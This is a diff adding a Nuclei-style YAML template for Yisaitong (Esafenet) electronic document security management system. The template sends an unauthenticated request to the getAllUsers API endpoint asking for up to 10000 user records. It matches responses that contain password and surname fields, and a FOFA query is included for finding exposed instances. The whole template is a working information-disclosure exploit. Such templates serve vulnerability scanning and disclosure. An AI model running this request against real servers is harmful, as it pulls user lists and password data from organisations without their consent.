@@ -1,0 +1,38 @@
+id: poc-yaml-yisaitong-esafenet-getallusers-info-leak
+info:
+  name: 亿赛通电子文档安全管理系统 getAllUsers 信息泄露漏洞
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: 信息泄露
+  metadata:
+    finger: 亿赛通电子文档安全管理系统
+    fofa: app="亿赛通-电子文档安全管理系统"
+
+http:
+  - raw:
+      - |
+        POST /CDGServer3/openapi/getAllUsers HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        pageSize=10000&pageNumber=1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"password\":"
+          - "\"surname\":"
+          - "\"message\":\"success\""
+      - type: word
+        part: header
+        words:
+          - "Path=/CDGServer3"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
